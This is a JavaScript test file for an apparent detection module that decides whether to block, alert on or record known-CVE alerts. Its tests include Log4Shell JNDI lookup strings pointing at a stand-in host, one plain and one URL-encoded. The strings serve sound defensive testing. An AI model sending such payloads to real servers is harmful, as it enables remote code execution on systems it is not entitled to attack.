import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile, copyFile, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { decide } from '../xdr/known-cve/decide.mjs';
import { runXdr } from '../scripts/xdr-run.mjs';

const fixture = JSON.parse(await readFile(new URL('../xdr/fixtures/known-cve.json', import.meta.url), 'utf8'));

test('all 24 official-shaped class fixtures classify by evidence rather than alert IDs', () => {
  assert.equal(fixture.schema, 'aleph.xdr.fixture.v1');
  assert.equal(fixture.moduleKey, 'known-cve');
  assert.equal(fixture.alerts.length, 24);
  const counts = { block: 0, alert: 0, record: 0 };
  for (const [index, entry] of fixture.alerts.entries()) {
    const expected = index < 8 ? 'block' : index < 16 ? 'alert' : 'record';
    const decision = decide(entry);
    assert.equal(decision.action, expected, entry.id);
    assert.equal(decide({ ...entry, id: 'different-' + index }).action, expected);
    assert.ok(Number.isFinite(decision.confidence));
    assert.ok(decision.confidence >= 0 && decision.confidence <= 1);
    assert.equal(typeof decision.reason, 'string');
    counts[decision.action]++;
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
});

test('CVE keyword and high Wazuh level alone never authorize blocking', () => {
  const falsePositive = {
    rule: { level: 13, mitre: ['T1190'], description: 'CVE-2021-44228 listed in documentation' },
    data: { srcip: '192.0.2.2', url: '/docs?q=CVE-2021-44228' },
  };
  assert.notEqual(decide(falsePositive).action, 'block');
  const narrative = { ...falsePositive, rule: { ...falsePositive.rule,
    description: 'A log line says ' + '$' + '{jndi:ldap://192.0.2.9/x} but request does not contain it' } };
  assert.notEqual(decide(narrative).action, 'block');
});

test('URL encoded remote lookup is still recognized; invalid input is recorded', () => {
  const malicious = {
    rule: { level: 12, mitre: ['T1190'] },
    data: { srcip: '192.0.2.1', url: '/search?q=%24%7Bjndi%3Aldap%3A%2F%2F192.0.2.9%2Fx%7D' },
  };
  assert.equal(decide(malicious).action, 'block');
  assert.equal(decide(null).action, 'record');
  assert.notEqual(decide({ ...malicious, data: { ...malicious.data, srcip: '' } }).action, 'block');
});

test('offline runner returns a valid result using a temporary isolated copy', async () => {
  const root = await mkdtemp(join(tmpdir(), 'xdr-known-cve-'));
  try {
    await mkdir(join(root, 'xdr/fixtures'), { recursive: true });
    await mkdir(join(root, 'xdr/known-cve'), { recursive: true });
    await writeFile(join(root, 'xdr/fixtures/known-cve.json'), JSON.stringify(fixture));
    await copyFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url),
      join(root, 'xdr/known-cve/decide.mjs'));
    const report = await runXdr({ root, moduleKey: 'known-cve' });
    assert.equal(report.schema, 'aleph.xdr.result.v1');
    assert.deepEqual(report.counts, { block: 8, alert: 8, record: 8 });
    assert.equal(report.decisions.length, 24);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
